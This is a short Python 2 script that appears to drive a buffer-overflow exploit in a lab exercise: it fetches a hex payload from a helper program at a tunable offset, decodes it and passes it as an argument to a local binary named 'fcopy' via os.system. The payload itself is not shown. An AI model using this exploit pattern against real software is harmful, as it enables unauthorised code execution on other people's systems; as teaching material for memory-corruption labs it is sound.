import commands, os

offset = 70 # you could modify the value of this virable according to what you observe on your system
payload = commands.getoutput('./print_payload '+str(offset))
print payload
payload = payload.decode('hex')
command = './fcopy '+payload+' somestring'
os.system(command)
